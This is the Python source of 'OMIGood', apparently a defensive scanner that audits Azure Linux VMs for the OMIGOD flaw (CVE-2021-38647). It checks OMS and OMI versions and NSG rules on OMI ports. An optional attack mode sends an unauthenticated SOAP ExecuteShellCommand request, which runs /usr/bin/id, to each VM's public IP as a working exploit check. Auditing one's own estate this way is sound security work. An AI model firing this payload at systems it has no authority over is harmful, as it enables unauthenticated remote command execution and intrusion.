import sys
import logging
import re
import argparse
import traceback
import requests
import json
from packaging.version import parse as parse_version
from typing import Dict, List, Optional, Any
from azure.identity import AzureCliCredential, InteractiveBrowserCredential
from azure.mgmt.resource import SubscriptionClient, ResourceManagementClient
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.network import NetworkManagementClient


LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logger = logging.getLogger("omigood")
log_handler = logging.StreamHandler(sys.stdout)
log_handler.setFormatter(logging.Formatter(LOG_FORMAT))
logger.addHandler(log_handler)
logger.setLevel(logging.INFO)
log_handler.setLevel(logging.INFO)


OMI_SERVICES = ["http/5985", "https/5986", "https/1270"]
OMS_EXTENSIONS = ["OMSAgentForLinux", "OmsAgentForLinux"]

OMI_PORTS = [int(service.split("/")[1]) for service in OMI_SERVICES]

MIN_PATCHED_OMI_VERSION = "1.6.8-1"
MIN_PATCHED_OMS_VERSION = "1.13.40"

BASH_SCRIPT = """
#!/bin/bash
if [ ! "$BASH_VERSION" ] ; then
    exec /bin/bash "$0" "$@"
fi
REGEX="OMI\\-([0-9\\.\\-]*) \\-"

OMIPATH="/opt/omi/bin/omiserver"
if ! [[ -x $OMIPATH ]]; then
        echo "OMI VERSION: Not Found"
        exit
fi
OMIVERSION=$($OMIPATH --version)

if ! [[ $OMIVERSION =~ $REGEX ]];
then
        echo "OMI VERSION: Cannot Detect"
        exit
else
        omi=${BASH_REMATCH[1]}
fi
echo "OMI VERSION: $omi"
OMILISTEN=$(netstat -anp | grep omiengine | grep LISTEN | egrep "^tcp")
if [[ -z "$OMILISTEN" ]];
then
        echo "OMI LISTENING ON TCP: NO"
else
        echo "OMI LISTENING ON TCP: YES"
        echo "$OMILISTEN"
fi
"""


def parse_azure_resource_id(resource_id: str) -> Optional[Dict[str, str]]:
    regex = r"^/subscriptions/([0-9\-A-z]+)/resourceGroups\/([^/]+)/.*/(.+)$"
    m = re.search(regex, resource_id)
    if not m:
        return None
    return {
        "subscription_id": m.group(1),
        "resource_group_name": m.group(2),
        "resource_name": m.group(3),
    }


def run_script_on_vm(
    cm: ComputeManagementClient, resource_group_name: str, vm_name: str, script: str
) -> str:
    # Run the script
    logger.info(
        f"Running shell script on VM {vm_name} to determine OMI version and status..."
    )
    params = {"command_id": "RunShellScript", "script": script.split("\n")}
    poller = cm.virtual_machines.begin_run_command(resource_group_name, vm_name, params)
    result = poller.result()
    if not result or not result.value or not result.value[0].message:
        logger.error(f"Cannot get result after running script on VM: {vm_name}")
    message = result.value[0].message
    logger.debug(f"Output from script on VM {vm_name}: {message}")
    return message


"""
 This function is simple and doesn't cover all cases.
 It just checks whether there is an inbound rule that contains a TCP or * allow in a port/port range for OMI.
 It doesn't check if such rules are shadowed by deny rules or the source IPs.
"""


def parse_rules(rules: List[Dict[str, Any]], ports: List[int]) -> bool:
    allowed_protocols = ["TCP", "*", "Tcp", "All"]
    if not rules:
        return False
    for r in rules:
        if r.get("direction") != "Inbound":
            continue
        if r.get("protocol") not in allowed_protocols:
            continue
        dest_port = r.get("dest_port")
        if not dest_port:
            continue
        for p in dest_port.split(","):
            if p == "*" or p == "0-65535":
                return True
            if "-" in p:  # range
                start, end = [int(a) for a in p.split("-", 2)]
                if start > end:
                    continue
            else:
                start = end = int(p)
            if any(start <= n <= end for n in ports):
                return True
    return False


def retrieve_vm_extensions(
    cm: ComputeManagementClient, resource_group_name: str, vm_name: str
) -> List[str]:
    vm_ext = cm.virtual_machine_extensions.list(resource_group_name, vm_name)
    if not vm_ext:
        logger.debug(f"Cannot retrieve Extensions for VM: {vm_name}")
        return []
    if len(vm_ext.value) == 0:
        logger.debug(f"VM {vm_name} has no Extensions")
        return []
    logger.debug(
        f'Extensions for VM {vm_name}: {",".join([x.name for x in vm_ext.value])}'
    )
    return vm_ext.value


def merge_str_list(s: str, lst: List[str]) -> str:
    if s and s not in lst:
        lst.append(s)
    return ",".join(list(set(lst)))


def print_rules(rules: List[Dict[str, Any]], header: str) -> str:
    output_str: str = ""
    if not rules:
        return output_str

    output_str += f"{header}:\n"
    for rule in rules:
        output_str += (
            f'\t{rule.get("direction")} {rule.get("protocol")} '
            f' {rule.get("access")} from {rule.get("source_addr")} ports '
            f'{rule.get("source_port")} to {rule.get("dest_addr")} ports {rule.get("dest_port")}\n'
        )
    return output_str


def check_nsg(
    nm: NetworkManagementClient, nsg_id: str, vm_name: str
) -> Optional[List[Dict[str, Any]]]:
    output_rules: List[Any] = []
    if not nsg_id:
        return output_rules

    nsg_info = parse_azure_resource_id(nsg_id)
    if not nsg_info:
        logger.error(f"Cannot parse NSG ID: {nsg_id}, skipping")
        return output_rules
    nsg = nm.network_security_groups.get(
        nsg_info.get("resource_group_name"), nsg_info.get("resource_name")
    )
    if not nsg or not nsg.security_rules:
        logger.error(
            (
                f'Cannot retrieve NSG datails or no rules available for NSG {nsg_info.get("resource_name")} '
                f'on resourceGroup {nsg_info.get("resource_group_name")} for VM {vm_name}'
            )
        )
        return output_rules
    for rule in nsg.security_rules:
        output_rules.append(
            {
                "direction": rule.direction,
                "protocol": rule.protocol,
                "access": rule.access,
                "source_addr": merge_str_list(
                    rule.source_address_prefix, rule.source_address_prefixes
                ),
                "source_port": merge_str_list(
                    rule.source_port_range, rule.source_port_ranges
                ),
                "dest_addr": merge_str_list(
                    rule.destination_address_prefix, rule.destination_address_prefixes
                ),
                "dest_port": merge_str_list(
                    rule.destination_port_range, rule.destination_port_ranges
                ),
            }
        )
    return output_rules


def check_effective_security_rules(
    nm: NetworkManagementClient, interface_info: Dict[str, str], vm_name: str
) -> Optional[List[Dict[str, Any]]]:
    output_rules: List[Any] = []
    logger.debug(
        f'Getting effective security rules for interface {interface_info.get("resource_name")} for VM {vm_name}'
    )
    poller = nm.network_interfaces.begin_list_effective_network_security_groups(
        interface_info.get("resource_group_name"), interface_info.get("resource_name")
    )
    result = poller.result()
    if not result or not result.value or not result.value[0].effective_security_rules:
        logger.error(
            f'Cannot get Effective Security Rules for interface {interface_info.get("resource_name")} on VM {vm_name}'
        )
        return output_rules

    for rule in result.value[0].effective_security_rules:
        output_rules.append(
            {
                "direction": rule.direction,
                "protocol": rule.protocol,
                "access": rule.access,
                "source_addr": merge_str_list(
                    rule.source_address_prefix, rule.source_address_prefixes
                ),
                "source_port": merge_str_list(
                    rule.source_port_range, rule.source_port_ranges
                ),
                "dest_addr": merge_str_list(
                    rule.destination_address_prefix, rule.destination_address_prefixes
                ),
                "dest_port": merge_str_list(
                    rule.destination_port_range, rule.destination_port_ranges
                ),
            }
        )
    return output_rules


def check_vm_netsec(
    nm: NetworkManagementClient,
    vm_name: str,
    vm_network_profile: Any,
    check_effective: bool,
) -> Optional[List[Dict[str, Any]]]:
    if len(vm_network_profile.network_interfaces) == 0:
        logger.debug(f"Cannot get list of interfaces for VM: {vm_name}")
        return None

    vm_interfaces = []
    for intf in vm_network_profile.network_interfaces:
        vm_interface = {"interface_id": intf.id}
        intf_config_string: str = ""
        interface_info = parse_azure_resource_id(intf.id)
        if not interface_info:
            logger.error(f"Cannot parse Interface ID: {intf.id}, skipping")
            continue
        logger.debug(
            f'Found network interface on VM {vm_name} named {interface_info.get("resource_name")}'
            f' on resourceGroup {interface_info.get("resource_group_name")}'
        )
        network_interface = nm.network_interfaces.get(
            interface_info.get("resource_group_name"),
            interface_info.get("resource_name"),
        )

        if not network_interface or not network_interface.ip_configurations:
            logger.debug(
                f'Cannot retrieve information for network interface {interface_info.get("resource_name")}'
                f" on VM {vm_name}"
            )
            continue
        vm_interface["mac_address"] = network_interface.mac_address
        intf_config_string += "Interface Configuration:\n"
        intf_config_string += f"\tMAC Address: {network_interface.mac_address}\n"
        intf_config_string += "\tIP Configurations:\n"
        vm_interface["ip_configurations"] = []
        for i in network_interface.ip_configurations:
            intf_ip_configuration = {"private_ip": i.private_ip_address}
            intf_config_string += f"\t\tPrivate IP: {i.private_ip_address}\n"
            if i.public_ip_address:
                public_ip_info = parse_azure_resource_id(i.public_ip_address.id)
                if not public_ip_info:
                    logger.error(
                        f"Cannot parse Public IP Address ID: {i.public_ip_address.id}, skipping"
                    )
                else:
                    public_ip = nm.public_ip_addresses.get(
                        public_ip_info.get("resource_group_name"),
                        public_ip_info.get("resource_name"),
                    )
                    if not public_ip:
                        logger.error(
                            f'VM {vm_name} on interface {interface_info.get("interface_name")} has public IP'
                            f' assigned ({public_ip_info.get("resource_name")}), but cannot retrieve its information'
                        )
                    else:
                        intf_config_string += (
                            f"\t\tPublic IP: {public_ip.ip_address}\n\n"
                        )
                        intf_ip_configuration["public_ip"] = public_ip.ip_address
            vm_interface["ip_configurations"].append(intf_ip_configuration)
        # Network Security Rules
        if not network_interface.network_security_group:
            logger.debug(
                f'Interface {interface_info.get("resource_name")} has no Network Security Group set on VM {vm_name}'
            )
        else:
            vm_interface["nsg_rules"] = check_nsg(
                nm, network_interface.network_security_group.id, vm_name
            )
            vm_interface["check_permissive_rules"] = (
                "YES" if parse_rules(vm_interface["nsg_rules"], OMI_PORTS) else "NO"
            )
            intf_config_string += print_rules(
                vm_interface["nsg_rules"], "Network Security Rules"
            )
        # Effective Security Rules
        if check_effective:
            try:
                vm_interface["effective_rules"] = check_effective_security_rules(
                    nm, interface_info, vm_name
                )
                vm_interface["check_permissive_effective_rules"] = (
                    "YES"
                    if parse_rules(vm_interface["effective_rules"], OMI_PORTS)
                    else "NO"
                )
                intf_config_string += print_rules(
                    vm_interface["effective_rules"], "Effective Security Rules"
                )
            except Exception as e:
                logger.warning(
                    f"Cannot retrieve VM Effective Security Rules, continuing. Got exception: {str(e)}"
                )
        logger.debug(intf_config_string)
        vm_interfaces.append(vm_interface)
    return vm_interfaces


def omi_check(proto: str, url: str, port: str) -> bool:

    uri = f"{proto}://{url}:{port}/wsman"

    body = """<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"
    xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"
    xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">
<s:Header>
 <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
 <w:SelectorSet>
     <w:Selector Name=\"__cimnamespace\">root/scx</w:Selector>
  </w:SelectorSet>
</s:Header>
<s:Body>
  <p:ExecuteShellCommand_INPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">
     <p:command>/usr/bin/id</p:command>
     <p:timeout>0</p:timeout>
  </p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
"""
    headers = {
        "Content-type": "application/soap+xml;charset=UTF-8",
        "User-Agent": "Microsoft WinRM Client",
    }

    response = requests.post(uri, data=body, headers=headers, verify=False)

    if response.status_code == 200:
        return True
    elif response.status_code == 404:
        return False


def attack_vm(vm_name: str, vm_interfaces: List[Dict[str, Any]]) -> bool:
    for vm_interface in vm_interfaces:
        for ip_configuration in vm_interface["ip_configurations"]:
            target_ip = ip_configuration.get("public_ip")
            if not target_ip:
                continue
            for srv in OMI_SERVICES:
                (proto, port) = srv.split("/")
                logger.info(
                    f"Trying to attack {vm_name} on IP {target_ip} on {proto}/{port}"
                )
                if omi_check(proto, target_ip, port):
                    return True
    return False


def main():
    parser = argparse.ArgumentParser(description="OMIGood scanner for CVE-2021-38647")
    parser.add_argument(
        "-v",
        "--verbose",
        help="[OPTIONAL] Verbose mode: Displays additional debug details.",
        action="store_true",
    )
    parser.add_argument(
        "--auth",
        help="Authentication mode. Default: azurecli.",
        choices=["azurecli", "interactivebrowser"],
        default="azurecli",
    )
    parser.add_argument(
        "-r",
        "--runscript",
        help=(
            "[OPTIONAL] Run Script. Runs bash script on target VMs to check for OMI server"
            ", agent and version. Disabled by default. Use at your own risk."
        ),
        action="store_true",
    )
    parser.add_argument(
        "-a",
        "--attack",
        help="[OPTIONAL] Try to attack the host. Disabled by default. Use at your own risk.",
        action="store_true",
    )
    parser.add_argument(
        "-e",
        "--effective",
        help=(
            "[OPTIONAL] Check Effective Security Rules. Disabled by default."
            " Requires higher permissions on Azure."
        ),
        action="store_true",
    )
    parser.add_argument(
        "-s",
        "--subscriptions",
        help="[OPTIONAL] Comma separate list of subscriptions IDs. If not specified, it will try all.",
        type=str,
    )
    parser.add_argument(
        "-g",
        "--resourcegroups",
        help="[OPTIONAL] Comma separated list of Resource Group names. If not specified,"
        " it will try all. If specified, it will work only with a single subscription provided.",
        type=str,
    )
    parser.add_argument(
        "-m",
        "--vms",
        help="[OPTIONAL] Comma separated list of VM names. If not specified,"
        " it will try all. If specified, it will work only with a single"
        " subscription and a single resource group provided.",
        type=str,
    )
    parser.add_argument(
        "-o", "--output", required=True, help="JSON output file with results.", type=str
    )

    try:
        args = parser.parse_args()
        if args.verbose:
            logger.setLevel(logging.DEBUG)
            log_handler.setLevel(logging.DEBUG)

        subs_to_check = []
        if args.subscriptions:
            subs_to_check = args.subscriptions.split(",")

        rgs_to_check = []
        if args.resourcegroups:
            if len(subs_to_check) != 1:
                print(
                    "Error: one and only one subscription ID must be specified if you use the -g option"
                )
                sys.exit(1)
            rgs_to_check = args.resourcegroups.split(",")

        vms_to_check = []
        if args.vms:
            if len(rgs_to_check) != 1:
                print(
                    "Error: one and only one Resource Group name must be specified if you use the -m option"
                )
                sys.exit(1)
            vms_to_check = args.vms.split(",")

        if args.auth == "azurecli":
            credential = AzureCliCredential()
        elif args.auth == "interactivebrowser":
            credential = InteractiveBrowserCredential()
        else:
            raise ValueError("Azure authentication mode not supported")

        subscription_client = SubscriptionClient(credential)
        vm_list = []

        if not subs_to_check:
            logger.info("Subscription IDs not specified, will check all.")
            subscriptions = subscription_client.subscriptions.list()
        else:
            logger.info(
                f'Checking the following subscription IDs: {",".join(subs_to_check)}'
            )
            subscriptions = [
                subscription_client.subscriptions.get(s) for s in subs_to_check
            ]

        for s in subscriptions:
            logger.info(
                f"Checking VMs in subscription: {s.subscription_id} ({s.display_name})"
            )
            rm = ResourceManagementClient(credential, s.subscription_id)
            cm = ComputeManagementClient(credential, s.subscription_id)
            nm = NetworkManagementClient(credential, s.subscription_id)

            if not rgs_to_check:
                rgs = rm.resource_groups.list()
            else:
                rgs = [rm.resource_groups.get(g) for g in rgs_to_check]

            for rg in rgs:
                logger.info(f"Checking Resource Group {rg.name}")

                if not rgs_to_check:
                    resources = rm.resources.list_by_resource_group(rg.name)
                else:
                    resources = [
                        rm.resources.get(
                            resource_group_name=rg.name,
                            resource_provider_namespace="Microsoft.Compute",
                            parent_resource_path="",
                            resource_type="virtualMachines",
                            resource_name=v,
                            api_version="2021-07-01",
                        )
                        for v in vms_to_check
                    ]

                for r in resources:
                    if r.type != "Microsoft.Compute/virtualMachines":
                        continue
                    vm = cm.virtual_machines.get(rg.name, r.name)
                    if not vm:
                        logger.debug(
                            f"Skipping VM {r.name}: cannot retrieve VM metadata"
                        )
                        continue
                    if not vm.os_profile.linux_configuration:
                        logger.debug(f"Skipping VM {r.name}: not Linux")
                        continue  # not Linux

                    logger.info(f"Found Linux VM: {r.name} with id {r.id}")

                    vm_state = cm.virtual_machines.instance_view(rg.name, r.name)
                    vm_power_state = ""
                    vm_oms_version = ""
                    if not vm_state:
                        logger.warn(f"Cannot retrieve instante view for VM {r.name}!")
                    if vm_state.statuses and isinstance(vm_state.statuses, list):
                        for status in vm_state.statuses:
                            if status.code.startswith("PowerState"):
                                vm_power_state = status.code.split("/")[1]
                    if (
                        vm_state.vm_agent
                        and vm_state.vm_agent.extension_handlers
                        and isinstance(vm_state.vm_agent.extension_handlers, list)
                    ):
                        for xha in vm_state.vm_agent.extension_handlers:
                            if all(o not in xha.type for o in OMS_EXTENSIONS):
                                continue
                            vm_oms_version = xha.type_handler_version

                    vm_interfaces: List[Dict[str, Any]] = []
                    if vm.network_profile:
                        check_effective = False
                        if args.effective:
                            if vm_power_state == "running":
                                check_effective = True
                            else:
                                logger.warning(
                                    f'Cannot retrieve Effective Rules for VM {r.name}: VM power state must be "running"'
                                )
                        vm_interfaces = check_vm_netsec(
                            nm, r.name, vm.network_profile, check_effective
                        )
                    vm_extensions = retrieve_vm_extensions(cm, rg.name, r.name)
                    vm_item = {
                        "vm_name": r.name,
                        "vm_id": r.id,
                        "rg_name": rg.name,
                        "subscription_id": s.subscription_id,
                        "subscription_name": s.display_name,
                        "vm_interfaces": vm_interfaces,
                        "computer_name": vm_state.computer_name
                        if vm_state
                        else "UNKNOWN",
                        "os_name": vm_state.os_name if vm_state else "UNKNOWN",
                        "os_version": vm_state.os_version if vm_state else "UNKNOWN",
                        "vm_extensions": ",".join([x.name for x in vm_extensions]),
                        "power_state": vm_power_state,
                        "vm_oms_version": vm_oms_version,
                    }

                    if vm_oms_version:
                        oms_version = parse_version(vm_oms_version)
                        if oms_version < parse_version(MIN_PATCHED_OMS_VERSION):
                            logger.info(f"VM {r.name} has a VULNERABLE version of OMS!")
                            vm_item["check_oms_vulnerable"] = "YES"
                        else:
                            vm_item["check_oms_vulnerable"] = "NO"

                    if any(
                        ext in vm_item["vm_extensions"].split(",")
                        for ext in OMS_EXTENSIONS
                    ):
                        vm_item["check_oms_extension"] = "YES"
                    else:
                        vm_item["check_oms_extension"] = "NO"

                    if any(
                        i.get("check_permissive_rules") == "YES" for i in vm_interfaces
                    ):
                        vm_item["check_permissive_rules"] = "YES"
                    else:
                        vm_item["check_permissive_rules"] = "NO"

                    if any(
                        i.get("check_permissive_effective_rules") == "YES"
                        for i in vm_interfaces
                    ):
                        vm_item["check_permissive_effective_rules"] = "YES"
                    else:
                        vm_item["check_permissive_effective_rules"] = "NO"

                    if args.runscript:
                        try:
                            message = run_script_on_vm(cm, rg.name, r.name, BASH_SCRIPT)
                            regex = r"OMI VERSION: (.+)\n"
                            m = re.search(regex, message)
                            if not m:
                                logger.error(
                                    f"Cannot determine OMI version number: {message}"
                                )
                            else:
                                omi_version = parse_version(m.group(1))
                                vm_item["omi_version"] = m.group(1)
                                if omi_version < parse_version(MIN_PATCHED_OMI_VERSION):
                                    logger.info(f"VM {r.name} is VULNERABLE")
                                    vm_item["check_omi_vulnerable"] = "YES"
                                    vm_item["bash_script_output"] = message
                                else:
                                    vm_item["check_omi_vulnerable"] = "NO"
                            regex = r"OMI LISTENING ON TCP: (.+)\n"
                            m = re.search(regex, message)
                            if not m:
                                logger.error(
                                    f"Cannot determine whether OMI is listening on TCP: {message}"
                                )
                            else:
                                if m.group(1) == "NO":
                                    logger.info("OMI is NOT listening on TCP")
                                    vm_item["check_omi_listening_on_tcp"] = "NO"
                                elif m.group(1) == "YES":
                                    logger.info(f"OMI IS listening to TCP: {message}")
                                    vm_item["check_omi_listening_on_tcp"] = "YES"
                                    vm_item["bash_script_output"] = message
                                else:
                                    vm_item["check_omi_listening_on_tcp"] = "UNKNOWN"
                        except Exception as e:
                            logger.warning(
                                f"Cannot run script on VM {r.name}, continuing. Exception: {str(e)}"
                            )

                    if args.attack:
                        try:
                            vulnerable = attack_vm(r.name, vm_interfaces)
                            if vulnerable:
                                logger.info(
                                    "Attack was successful: machine is vulnerable!"
                                )
                                vm_item["check_attack_successful"] = "YES"
                            else:
                                logger.info("Attack was unsuccessful")
                                vm_item["check_attack_successful"] = "NO"
                        except Exception as e:
                            logger.warning(
                                f"Attack VM failed on VM {r.name}, continuing. Exception: {str(e)}"
                            )
                            vm_item["check_attack_successful"] = "NO"

                    vm_list.append(vm_item)
        if args.output:
            with open(args.output, "w") as fd:
                json.dump({"omigood_scan": vm_list}, fd)

    except Exception as e:
        logger.error(
            f"Got Exception, exiting!\nException: {str(e)}\n{traceback.format_exc()}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
